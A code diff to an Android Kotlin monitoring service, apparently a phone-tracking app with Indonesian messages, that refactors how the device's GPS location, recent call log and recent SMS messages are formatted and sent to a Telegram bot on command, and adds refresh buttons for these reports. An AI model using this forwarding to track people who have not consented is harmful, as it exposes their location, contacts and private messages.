@@ -4022,6 +4022,9 @@ class MonitoringService : Service() {
                     "status" -> statusReportText()
                     "battery" -> batteryReportText()
                     "storage" -> storageReportText()
+                    "location" -> locationReportText()
+                    "lastcalls" -> lastCallsReportText()
+                    "lastsms" -> lastSmsReportText()
                     else -> null
                 }
                 if (teks != null) {
@@ -7127,26 +7130,31 @@ class MonitoringService : Service() {
 
     private suspend fun handleLocationCommand(privateChat: Boolean) {
         if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
-        if (!hasLocationPermission()) {
-            sendToTelegram("⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi.")
-        } else {
+        if (hasLocationPermission()) {
             sendToTelegram("📍 Mencari lokasi…")
-            val location = fetchLocation(allowStale = true)
-            if (location == null) {
-                bumpLocFailCount()
-                sendToTelegram("⚠️ Lokasi tak didapat: " + locationFailureHint())
-            } else {
-                resetLocFailCount()
-                val stale = isStaleFix(location)
-                val prev = if (stale) null else lastSentLatLon()
-                val dist = if (prev == null) -1f else ReportFormat.distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
-                if (!stale) {
-                    rememberSentLatLon(location.latitude, location.longitude, location.accuracy)
-                    try { checkGeofence(location.latitude, location.longitude, location.accuracy, fixAtMs = location.time) } catch (_: Exception) { }
-                }
-                val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
-                sendToTelegram("📍 <b>Lokasi</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\n${ReportFormat.accuracyText(location.accuracy)}$near" + fixAgeNote(location))
+        }
+        sendToTelegram(locationReportText(), markupSegarkan("location"))
+    }
+
+    private suspend fun locationReportText(): String {
+        if (!hasLocationPermission()) {
+            return "⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi."
+        }
+        val location = fetchLocation(allowStale = true)
+        if (location == null) {
+            bumpLocFailCount()
+            return "⚠️ Lokasi tak didapat: " + locationFailureHint()
+        } else {
+            resetLocFailCount()
+            val stale = isStaleFix(location)
+            val prev = if (stale) null else lastSentLatLon()
+            val dist = if (prev == null) -1f else ReportFormat.distanceMeters(prev.first, prev.second, location.latitude, location.longitude)
+            if (!stale) {
+                rememberSentLatLon(location.latitude, location.longitude, location.accuracy)
+                try { checkGeofence(location.latitude, location.longitude, location.accuracy, fixAtMs = location.time) } catch (_: Exception) { }
             }
+            val near = if (dist >= 0f) "\nJarak dari laporan terakhir: ${dist.toInt()} m" else ""
+            return "📍 <b>Lokasi</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\n${ReportFormat.accuracyText(location.accuracy)}$near" + fixAgeNote(location)
         }
     }
 
@@ -7573,38 +7581,42 @@ class MonitoringService : Service() {
 
     private suspend fun handleLastCallsCommand(privateChat: Boolean) {
         if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+        sendToTelegram(lastCallsReportText(), markupSegarkan("lastcalls"))
+    }
+
+    private suspend fun lastCallsReportText(): String {
         if (!hasCallLogPermission()) {
-            sendToTelegram("⚠️ Izin log panggilan hilang. Berikan di Setup.")
-            return
+            return "⚠️ Izin log panggilan hilang. Berikan di Setup."
         }
         val calls = try { callLogRepository.getAllCalls(5) } catch (_: Exception) {
-            sendToTelegram("⚠️ Gagal membaca riwayat panggilan. Coba lagi.")
-            return
+            return "⚠️ Gagal membaca riwayat panggilan. Coba lagi."
         }
         if (calls.isEmpty()) {
-            sendToTelegram("📞 Tak ada riwayat panggilan.")
+            return "📞 Tak ada riwayat panggilan."
         } else {
             val knownCalls = try { calls.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
-            sendToTelegram(formatCallMessage(calls, knownCalls, live = false))
+            return formatCallMessage(calls, knownCalls, live = false)
         }
     }
 
     private suspend fun handleLastSmsCommand(privateChat: Boolean) {
         if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
+        sendToTelegram(lastSmsReportText(), markupSegarkan("lastsms"))
+    }
+
+    private suspend fun lastSmsReportText(): String {
         if (!hasSmsPermission()) {
-            sendToTelegram("⚠️ Izin SMS hilang. Berikan di Setup.")
-            return
+            return "⚠️ Izin SMS hilang. Berikan di Setup."
         }
         val sms = try { smsRepository.getRecentSms(5) } catch (_: Exception) {
-            sendToTelegram("⚠️ Gagal membaca SMS. Coba lagi.")
-            return
+            return "⚠️ Gagal membaca SMS. Coba lagi."
         }
         if (sms.isEmpty()) {
-            sendToTelegram("💬 Tak ada SMS.")
+            return "💬 Tak ada SMS."
         } else {
             val knownSms = try { sms.map { it.address }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
             val freqSms = try { freqForNumbers(sms.map { it.address }) } catch (_: Exception) { null }
-            sendToTelegram(formatSmsMessage(sms, freqSms, knownSms, live = false))
+            return formatSmsMessage(sms, freqSms, knownSms, live = false)
         }
     }
 
